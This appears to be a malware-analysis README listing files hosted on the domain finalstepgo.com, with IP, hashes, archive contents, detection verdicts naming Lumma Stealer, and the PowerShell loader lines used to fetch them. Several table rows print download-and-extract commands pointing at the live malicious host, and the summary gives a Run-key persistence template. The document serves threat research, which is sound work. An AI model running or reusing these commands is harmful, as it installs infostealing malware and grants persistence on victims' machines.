# Malicious File Analysis

This repository contains an analysis of potentially malicious files hosted at the domain `finalstepgo.com`. Below is a table summarizing the details of each file, including file types, hashes, detection verdicts, and associated PowerShell scripts used for execution.

| URL | IP | ASN | File Type | Size | Hash 1 | Hash 2 | Hash 3 | Archive Details (Modified, Filename, Size, MD5, File Type) | Detections | PowerShell Script |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| [finalstepgo.com/uploads/il22.zip](https://finalstepgo.com/uploads/il22.zip) | 185.255.122.133 | #30860 Virtual Systems LLC | Zip archive data, deflate compression | 1.7 MB (1714598 bytes) | bca16f882810081cb32748749bc3b3b1 | 9793ad1d9e270d4bad64cf70720eebbefd74b15c | c2ffa5c0bb241ec42c82bd96e407882be9089f5a6949fcb403d75d40bcdadcda | 2024-09-28 07:26, unins000_[3MB]_[unsign].exe, 3.8 MB, 8721699b29c1426b4436ae40192280e6, PE32 executable (GUI) Intel 80386, 10 sections | | `$mTMPD6X8='https://finalstepgo.com/uploads/il22.zip'; $tk4wMJU=$env:APPDATA+'\Ueb2AL6'; Start-BitsTransfer -Source $mTMPD6X8 -Destination $AAW19F1; Expand-Archive -Path $AAW19F1 -DestinationPath $tk4wMJU -Force;` |
| [finalstepgo.com/uploads/il33.zip](https://finalstepgo.com/uploads/il33.zip) | 185.255.122.133 | #30860 Virtual Systems LLC | Zip archive data, deflate compression | 1.5 MB (1505043 bytes) | d8de3fc756e44c203d77aebcabb881c5 | 509d8b3479ddbe9aa8bea5ce11fd625643d5c43e | f2fe375b56b096384279f11746224a7f6f4a24f7ffff15dc7c0fea4b26eacd1d | 2024-09-28 07:46, BulkSMSMultiModem(Demo)_[3MB]_[unsign].exe, 4.0 MB, 9d7ab5897fe11671c4aeeeb5f1599014, PE32 executable (GUI) Intel 80386, 5 sections | | `$j967rvVm='https://finalstepgo.com/uploads/il33.zip'; $3cPhU0No=$env:APPDATA+'\3bqbRyEA'; Start-BitsTransfer -Source $j967rvVm -Destination $v2d2cLn9;` |
| [finalstepgo.com/uploads/trr9.txt](https://finalstepgo.com/uploads/trr9.txt) | 185.255.122.133:443 | #30860 Virtual Systems LLC | ASCII text, long lines, no terminators | 337 B | a6c05faf990324a716d3ba6674ffeee6 | 25b5712ffa8d3247598b4d594d7e56a3ad0d5434 | abf42a3d48909645a34458ca052d726bdfc6033aee7a58d469b34d0e752f8fe6 | | | Not applicable |
| [finalstepgo.com/uploads/il11.zip](https://finalstepgo.com/uploads/il11.zip) | 185.255.122.133 | #30860 Virtual Systems LLC | Zip archive data, deflate compression | 1.7 MB (1691913 bytes) | 7a85d23ec2f561b1ed339997f4a15f93 | 046345b27e2ff77b661f13bf2b08646a6ecd4198 | 74859fe958e537eeff649ec31957c0745366b0b1f8d3710b8a31e06059b503e0 | 2024-09-28 07:34, RemBlankPwd_[3MB]_[1sig].exe, 4.0 MB, 1ecd7e1516e51d0778f4dd5a48a8df88, PE32 executable (GUI) Intel 80386, 11 sections | | `$oluAE7Dk='https://finalstepgo.com/uploads/il11.zip'; $rtfflBeM=$env:APPDATA+'\W7nzivF8'; Start-BitsTransfer -Source $oluAE7Dk -Destination $rtfflBeM;` |
| [finalstepgo.com/uploads/il11.txt](https://finalstepgo.com/uploads/il11.txt) | 185.255.122.133:443 | #30860 Virtual Systems LLC | ASCII text, long lines, no terminators | 366 B | 063d1917dfcc075690cd9f7253b3974a | d210792d0aeafb484e169aba33e4a4243babb74d | 4337242a9077230b296e66064b044a2cd390b6a2a7dbefae6f66bdd0bf5eee51 | | | Not applicable |
| [finalstepgo.com/uploads/il22.txt](https://finalstepgo.com/uploads/il22.txt) | 185.255.122.133:443 | #30860 Virtual Systems LLC | ASCII text, long lines, no terminators | 359 B | b6ef25d05289446e4a213753af23ba53 | 96516cc8c923dfc6ce7d8fd2e7034557824f2d92 | 184b6a800c6fc568f6c8e20a3619fb4856823ddc1d530a64812993a7044f237c | | ThreatFox (malicious, Lumma Stealer), mnemonic secure DNS (malicious, Sinkholed), Quad9 DNS (malicious, Sinkholed) | Not applicable |
| [finalstepgo.com/uploads/tr222.zip](https://finalstepgo.com/uploads/tr222.zip) | 185.255.122.133 | #30860 Virtual Systems LLC | Zip archive data, deflate compression | 13 MB (12752028 bytes) | a40dad83041f5242dac7765235ba9897 | 14f4892480f04fb616291101af4c285caee8a857 | 9a31550508a115c46940a410ce10e7825bcf95961ddfc8ec4fde191580b3a548 | 2024-09-22 16:45, Feel.Your.Sound.exe, 790 MB, ea077b88a4c9d0943217c2858fff5ff8, PE32+ executable (GUI) x86-64, 12 sections | VirusTotal (malicious, 15/62 detected) | `$X0N2L10k='https://finalstepgo.com/uploads/tera9.zip'; $eaBolo6=$env:APPDATA+'\unJqnydS'; Start-BitsTransfer -Source $X0N2L10k -Destination $eaBolo6;` |
| [finalstepgo.com/uploads/il33.txt](https://finalstepgo.com/uploads/il33.txt) | 185.255.122.133:443 | #30860 Virtual Systems LLC | ASCII text, long lines, no terminators | 348 B | e785810a437b9f326744115f89a44ca3 | 0039fc1470982d2e27daa5b6ae1d618b69916576 | 4df97fd0d069bdf633111574ddc5adc887dd9c9bf06456da295ee94faeb9e39b | | ThreatFox (malicious, Lumma Stealer), mnemonic secure DNS (malicious, Sinkholed), Quad9 DNS (malicious, Sinkholed) | Not applicable |
| [finalstepgo.com/uploads/il44.zip](https://finalstepgo.com/uploads/il44.zip) | 185.255.122.133 | #30860 Virtual Systems LLC | Zip archive data, deflate compression | 3.4 MB (3364661 bytes) | ebf62ace877034507b83250102b40e15 | 0bad5f2014aee5c525a1e79c54e94640d593f48e | 7485cbe78882e3102642041a57044d69eedaa5b3c47bf9c0f5b1c713654eae20 | 2024-09-29 18:51, BrightnessControl.exe, 8.2 MB, 2b8796d87de0592eda9f038a075ff1d6, PE32 executable (GUI) Intel 80386, 7 sections | | Not applicable |

## Summary of PowerShell Scripts

The PowerShell scripts associated with these files were used to:

1. Download ZIP files from the specified URLs.
2. Extract the contents to the AppData folder.
3. Remove the downloaded archive file.
4. Set up persistence via Windows Registry by adding the extracted executables to the startup.

The following PowerShell commands were common across these scripts:

```powershell
Start-BitsTransfer -Source <URL> -Destination <DestinationPath>;
Expand-Archive -Path <DownloadedFile> -DestinationPath <ExtractedLocation> -Force;
New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name '<RegistryName>' -Value '<ExecutablePath>' -PropertyType 'String';
